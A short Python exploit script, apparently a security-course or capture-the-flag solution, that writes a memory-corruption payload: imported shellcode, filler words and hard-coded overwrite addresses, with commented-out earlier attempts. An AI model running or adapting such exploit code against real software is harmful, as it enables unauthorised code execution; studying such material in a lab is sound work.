import sys
# hexnum = 0x80488c5
# hexnum.to_bytes(4, 'little')
from struct import pack
from shellcode import shellcode

# sys.stdout.buffer.write(pack("<I", 0x80488c5))

sys.stdout.buffer.write(pack("<I", 0xFFFFFFFF))
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(pack("<I", 0x00))
sys.stdout.buffer.write(pack("<I", 0x00))
# sys.stdout.buffer.write(pack("<I", 0x11111111))
# sys.stdout.buffer.write(pack("<I", 0x11))

for i in range(0, 3):
	sys.stdout.buffer.write(pack("<I", 0x11111111))
# sys.stdout.buffer.write(pack("<I", 0x1))
# sys.stdout.buffer.write(b"20")
# sys.stdout.buffer.write(pack("<I", 0x2222))
#sys.stdout.buffer.write(pack("<I", 0x222222bf))
#sys.stdout.buffer.write(pack("<I", 0xfe857422))
# bffe8598
sys.stdout.buffer.write(pack("<I", 0xfe858022))
sys.stdout.buffer.write(pack("<I", 0x222222bf))
# sys.stdout.buffer.write(pack("<I", 0xbffe8574))

